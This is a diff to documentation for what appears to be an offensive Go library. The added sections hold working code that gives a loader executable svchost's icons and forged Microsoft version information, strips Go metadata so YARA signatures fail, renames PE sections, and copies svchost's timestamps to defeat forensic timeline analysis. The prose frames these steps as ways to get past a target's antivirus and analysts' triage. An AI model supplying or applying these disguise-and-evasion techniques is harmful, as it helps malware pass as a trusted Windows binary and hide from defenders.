@@ -9,7 +9,7 @@
 
 ---
 
-## For Beginners
+## Primer
 
 Task Manager and Process Explorer trust the icon, company name, and description inside a PE's resource section. Masquerade copies those resources from a trusted binary (`svchost.exe`, `cmd.exe`, `notepad.exe`) into yours at build time, so the analyst's first-pass "what is this?" answers with `Microsoft Corporation`. The underlying code, imports, and unsigned status still give it away to anyone who looks past the icon.
 
@@ -191,6 +191,99 @@ evidence so `dir /tq` and timeline-reconstruction tools see the
 binary blending in with its claimed origin. Neither alone fools a
 signature check, but together they survive triage long enough to
 matter.
+
+---
+
+## Advanced — Icon-Swap with Custom VERSIONINFO
+
+Use svchost's icon pack but supply bespoke VERSIONINFO so every field reads
+exactly what you need — useful when the target AV checks specific field
+combinations (e.g. OriginalFilename vs on-disk name).
+
+```go
+//go:build ignore
+// generator.go — run once; commit the resulting .syso.
+
+package main
+
+import (
+    "log"
+
+    "github.com/oioio-space/maldev/pe/masquerade"
+)
+
+func main() {
+    err := masquerade.Build("resource_windows_amd64.syso", masquerade.AMD64,
+        masquerade.WithSourcePE(`C:\Windows\System32\svchost.exe`), // steal icons only
+        masquerade.WithExecLevel(masquerade.AsInvoker),
+        masquerade.WithVersionInfo(&masquerade.VersionInfo{
+            FileDescription:  "Host Process for Windows Services",
+            CompanyName:      "Microsoft Corporation",
+            ProductName:      "Microsoft® Windows® Operating System",
+            OriginalFilename: "svchost.exe",
+            FileVersion:      "10.0.22621.3007",
+            ProductVersion:   "10.0.22621.3007",
+        }),
+    )
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+```
+
+---
+
+## Combined Example — Clone + Strip + Timestomp in One Pipeline
+
+After `masquerade.Clone` generates the `.syso` and `go build` produces the
+EXE, run a single post-build step that strips Go metadata and blends the
+file timestamps in one pass.
+
+```go
+//go:build ignore
+// postbuild.go — run after `go build`.
+
+package main
+
+import (
+    "log"
+    "os"
+
+    "github.com/oioio-space/maldev/cleanup/timestomp"
+    "github.com/oioio-space/maldev/pe/strip"
+)
+
+func main() {
+    const exe = `.\loader.exe`
+    const ref = `C:\Windows\System32\svchost.exe`
+
+    // 1. Strip Go metadata (pclntab, section names, timestamp) so runtime
+    //    YARA rules and go-parser fingerprinting fail.
+    raw, err := os.ReadFile(exe)
+    if err != nil {
+        log.Fatal(err)
+    }
+    raw = strip.Sanitize(raw)
+    raw = strip.WipePclntab(raw)
+    raw = strip.RenameSections(raw, map[string]string{
+        ".text":  ".code",
+        ".rdata": ".rodata",
+    })
+    if err := os.WriteFile(exe, raw, 0o644); err != nil {
+        log.Fatal(err)
+    }
+
+    // 2. Align MFT timestamps with the reference svchost so timeline
+    //    triage places the file in the OS install window, not today.
+    if err := timestomp.CopyFromFull(ref, exe); err != nil {
+        log.Fatal(err)
+    }
+}
+```
+
+Layered benefit: `masquerade` supplies the Microsoft identity (icon + VERSIONINFO);
+`pe/strip` removes Go-specific metadata that defeats identity claims; `timestomp`
+hides the creation event from MFT-based timeline reconstruction.
 
 ---
 
